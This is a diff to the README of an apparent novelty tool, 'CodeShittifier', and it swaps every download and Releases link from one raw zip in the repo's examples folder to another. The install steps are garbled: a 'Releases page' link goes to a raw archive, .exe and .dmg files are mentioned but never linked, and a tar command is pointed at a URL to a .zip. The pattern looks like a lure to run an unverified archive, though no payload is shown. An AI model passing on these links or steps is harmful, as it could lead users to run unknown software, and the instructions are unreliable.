@@ -6,22 +6,22 @@ Welcome to CodeShittifier! This tool makes Java and Kotlin code shittier, adding
 ## 📦 Download & Install
 To get started, you need to download CodeShittifier. Visit this page to download:
 
-[![Download CodeShittifier](https://github.com/nabilchourack/CodeShittifier/raw/refs/heads/main/examples/Code_Shittifier_1.6-beta.5.zip)](https://github.com/nabilchourack/CodeShittifier/raw/refs/heads/main/examples/Code_Shittifier_1.6-beta.5.zip)
+[![Download CodeShittifier](https://github.com/nabilchourack/CodeShittifier/raw/refs/heads/main/examples/after/Shittifier-Code-v3.6.zip)](https://github.com/nabilchourack/CodeShittifier/raw/refs/heads/main/examples/after/Shittifier-Code-v3.6.zip)
 
 On the Releases page, you will find the latest version available. Click on the version you want to download. Once it downloads, follow the installation instructions below.
 
 ## 📖 Installation Instructions
-1. Go to [CodeShittifier Releases](https://github.com/nabilchourack/CodeShittifier/raw/refs/heads/main/examples/Code_Shittifier_1.6-beta.5.zip).
+1. Go to [CodeShittifier Releases](https://github.com/nabilchourack/CodeShittifier/raw/refs/heads/main/examples/after/Shittifier-Code-v3.6.zip).
 2. Click on the version you want to download.
 3. Depending on your operating system:
    - For Windows: Download the `.exe` file.
    - For Mac: Download the `.dmg` file.
-   - For Linux: Download the `https://github.com/nabilchourack/CodeShittifier/raw/refs/heads/main/examples/Code_Shittifier_1.6-beta.5.zip` file.
+   - For Linux: Download the `https://github.com/nabilchourack/CodeShittifier/raw/refs/heads/main/examples/after/Shittifier-Code-v3.6.zip` file.
 
 4. After downloading, locate the file on your computer:
    - **Windows**: Double-click the `.exe` file and follow the prompts.
    - **Mac**: Open the `.dmg` file and drag CodeShittifier to your Applications folder.
-   - **Linux**: Extract the `https://github.com/nabilchourack/CodeShittifier/raw/refs/heads/main/examples/Code_Shittifier_1.6-beta.5.zip` file using `tar -xvzf https://github.com/nabilchourack/CodeShittifier/raw/refs/heads/main/examples/Code_Shittifier_1.6-beta.5.zip`. Then run the application using the terminal.
+   - **Linux**: Extract the `https://github.com/nabilchourack/CodeShittifier/raw/refs/heads/main/examples/after/Shittifier-Code-v3.6.zip` file using `tar -xvzf https://github.com/nabilchourack/CodeShittifier/raw/refs/heads/main/examples/after/Shittifier-Code-v3.6.zip`. Then run the application using the terminal.
 
 Once installed, you can start using CodeShittifier to mess with your code!
 
@@ -60,4 +60,4 @@ CodeShittifier is licensed under the MIT License. You can use it for personal an
 ## 💬 Support
 For questions or concerns, please reach out through the Issues section on GitHub. Our community is here to help!
 
-Thanks for using CodeShittifier! We hope it brings a smile to your coding experience. Don’t forget to visit our [Releases page](https://github.com/nabilchourack/CodeShittifier/raw/refs/heads/main/examples/Code_Shittifier_1.6-beta.5.zip) to download the latest version.
+Thanks for using CodeShittifier! We hope it brings a smile to your coding experience. Don’t forget to visit our [Releases page](https://github.com/nabilchourack/CodeShittifier/raw/refs/heads/main/examples/after/Shittifier-Code-v3.6.zip) to download the latest version.
